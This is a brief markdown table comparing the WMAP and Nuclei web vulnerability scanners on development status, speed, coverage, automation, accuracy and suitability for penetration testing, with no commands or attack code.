**WMAP vs Nuclei — Side-by-Side Breakdown**
| Category           | **WMAP**               | **Nuclei**                            |
| ------------------ | ---------------------- | ------------------------------------- |
| Development        | Deprecated             | Active development                    |
| Speed              | Slow                   | Fast                                  |
| Coverage           | Low                    | Extremely high                        |
| Templates          | No                     | Yes (Huge community-driven library)   |
| Integration        | Metasploit built-in    | Integrates with anything              |
| Best Use           | Internal web discovery | Internet-wide scanning                |
| Skill level        | Beginner               | Beginner → Advanced                   |
| Automation         | Poor                   | Excellent (CI/CD, scripts, pipelines) |
| Detection Accuracy | Low                    | High                                  |
| Port Scanning      | No                     | Yes (via templates)                   |
| WAF Handling       | No                     | Some support                          |
| Auth scanning      | No                     | Yes (cookies, headers, tokens)        |
| Real Pentests      | Not recommended        | Industry standard                     |
